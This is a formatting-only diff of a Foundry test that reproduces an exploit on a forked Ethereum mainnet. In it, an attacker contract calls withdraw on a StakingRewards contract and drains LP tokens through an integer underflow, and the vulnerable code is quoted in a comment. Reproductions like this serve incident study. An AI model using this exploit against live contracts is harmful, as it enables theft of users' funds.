@@ -14,7 +14,6 @@ import "./interface.sol";
 interface IStakingRewards {
     function withdraw(uint256 amount) external;
 }
-  
 
 contract AttackContract is Test {
     CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
@@ -22,14 +21,14 @@ contract AttackContract is Test {
     IERC20 constant uniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);
 
     function setUp() public {
-        cheat.createSelectFork("mainnet", 14421983);    // Fork mainnet at block 14421983
+        cheat.createSelectFork("mainnet", 14_421_983); // Fork mainnet at block 14421983
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)),18);
+        emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
 
-        StakingRewards.withdraw(8792873290680252648282);  //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.
-        
+        StakingRewards.withdraw(8_792_873_290_680_252_648_282); //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.
+
         /*
         StakingRewards contract, vulnerable code snippet.
     function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {
@@ -39,7 +38,6 @@ contract AttackContract is Test {
         _totalSupply = _totalSupply - amount;
         _balances[user] = _balances[user] - amount;   //<---- underflow here.
         */
-        emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)),18);
-
+        emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
     }
 }
